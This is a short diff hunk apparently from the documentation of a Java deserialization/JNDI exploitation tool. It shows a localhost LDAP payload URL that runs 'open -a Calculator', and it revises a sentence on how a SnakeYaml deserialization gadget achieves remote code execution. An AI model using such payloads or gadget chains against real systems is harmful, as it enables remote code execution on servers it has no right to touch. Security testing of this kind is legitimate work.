@@ -192,7 +192,7 @@ ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
 
 Use SnakeYaml deserialization to achieve RCE
 
-The deserialization part uses URLClassLoader to load the `javax.script.ScriptEngineManager` SPI implementation class, which internally executes JavaScript code through the ScriptEngine
+The deserialization part uses URLClassLoader to load the `javax.script.ScriptEngineManager` SPI implementation class, and internally calls defineClass for class loading
 
 ```bash
 # SnakeYaml Bypass
